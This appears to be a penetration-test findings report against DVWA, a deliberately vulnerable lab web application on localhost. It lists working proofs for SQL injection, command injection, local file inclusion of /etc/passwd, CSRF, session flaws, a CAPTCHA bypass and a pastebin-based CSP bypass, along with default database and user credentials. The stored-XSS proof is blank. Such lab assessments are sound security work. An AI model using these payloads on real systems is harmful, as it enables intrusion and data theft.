title: Sensitive config file exposure (no authentication required)
proof: DB password 'vulnerables' readable in backup config WITHOUT authentication: GET /config/config.inc.php.bak as anon user returns $_DVWA['db_password'] = 'vulnerables', $_DVWA['db_user'] = 'app', $_DVWA['db_database'] = 'dvwa'

title: Public directory listing of /config/ exposes database credentials
proof: Anonymous GET http://127.0.0.1:8081/config/ returns directory listing with config.inc.php.bak, config.inc.php.dist, config.inc.php. The .bak file reveals: $_DVWA['db_server']='127.0.0.1'; $_DVWA['db_database']='dvwa'; $_DVWA['db_user']='app'; $_DVWA['db_password']='vulnerables'.

title: SQL Injection (UNION-based) in id parameter - /vulnerabilities/sqli/
proof: id=1' UNION SELECT user(),database()-- - returns First name: app@localhost, Surname: dvwa. id=1' UNION SELECT version(),@@version_compile_os-- - returns First name: 10.1.26-MariaDB-0+deb9u1, Surname: debian-linux-gnu. Extracted 5 user password hashes via UNION SELECT user,password FROM users.

title: Command Injection - arbitrary system command execution
proof: POST ip=127.0.0.1;ls+-la&Submit=Submit executes both ping and 'ls -la' command, returning directory listing of /vulnerabilities/exec/

title: Session fixation - PHPSESSID not regenerated on login
proof: PHPSESSID verified unchanged before and after authentication: pre-login ID '24ofb49tv42etbdgeam3nrn7s6' remains identical post-login with 302 redirect to index.php and full authenticated session; 'You have logged in as admin' confirmed on replayed authenticated request using same PHPSESSID
precondition: Access to login page (no auth required)

title: Weak sequential session IDs (dvwaSession)
proof: POST /vulnerabilities/weak_id/ (Generate button) → Set-Cookie: dvwaSession=1, subsequent clicks set dvwaSession=2,3,4,5,6... The cookie is a simple sequential integer.

title: Stored Cross-Site Scripting (XSS) in Guestbook
proof:
POST txtName=&mtxMessage= → stored entries appear unescaped in page:
Name:
Message:

title: CSRF - Password change without anti-CSRF token
proof:
GET /vulnerabilities/csrf/?password_new=csrfdemo&password_conf=csrfdemo&Change=Change returns '
Password Changed.
'. New password 'csrfdemo' successfully authenticates admin login. Password restored to 'password' via same method. No CSRF token required, no re-authentication.

title: Brute Force – No CSRF token or rate limiting on login form
proof: GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login → 'Username and/or password incorrect'. GET-based form with no CSRF token, no captcha, no rate limiting observed.

title: Directory listing of /hackable/users/ publicly accessible - username enumeration
proof: Anonymous GET http://127.0.0.1:8081/hackable/users/ returns HTTP 200 with HTML page listing files: admin.jpg, gordonb.jpg, pablo.jpg, smithy.jpg, 1337.jpg. All five avatar files also downloadable without authentication (HTTP 200, sizes 2.9-4.3KB).

title: Local File Inclusion (LFI) via page parameter
proof: GET /vulnerabilities/fi/?page=../../../../../etc/passwd returned root:x:0:0:root:/root:/bin/bash and other system users. Also php://filter/read=convert.base64-encode/resource=../../vulnerabilities/fi/source/low.php returned base64-encoded source confirming no input sanitization ($file = $_GET['page']).

title: Blind SQL Injection (Boolean + Time-based) in id parameter - /vulnerabilities/sqli_blind/
proof: Boolean differential: id=1' AND 1=1# → 'User ID exists in the database.' vs id=1' AND 1=2# → 'User ID is MISSING from the database.' Time-based: id=1' AND SLEEP(3)# → 3011ms delay; id=1' AND SLEEP(3) AND 1=2# → 12ms (false prevents sleep).

title: No privilege separation between users - identical access levels
proof: Dual-actor test: admin (password) and gordonb (abc123) both access the same protected pages (brute, csrf, sqli) with HTTP 200. Both can execute SQL injection to read other users' data. No admin/gordonb privilege distinction exists in the application.

title: Broken access control — cross-actor or unauthenticated object access
proof: Authz matrix HTTP proof: anon GET /hackable/users/ → 200 (sensitive collection); write_tried=False; cells_sample=[{"resource": "/hackable/users/", "actor": "anon", "method": "GET", "status": 200, "id": null}, {"resource": "/profile/image/url", "actor": "anon", "method": "GET", "status": 404, "id": null}, {"resource": "/hackable/uploads", "actor": "anon", "method": "GET", "status": 200, "id": null}]

title: Insecure CAPTCHA - step parameter bypass (no reCAPTCHA verification on final step)
proof: Source code confirms step=2 flow skips reCAPTCHA check entirely (no recaptcha_check_answer call). Sending POST with step=2&password_new=X&password_conf=X&Change=Change changes password without any CAPTCHA verification. reCAPTCHA API key is missing from config, making step=1 always fail.

title: CSP Bypass via allowlisted external script sources
proof: CSP header: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com . POST with include=https://pastebin.com/raw/123 results in <script src='https://pastebin.com/raw/123'></script> being injected into the page, successfully bypassing CSP via the allowlisted pastebin.com domain.
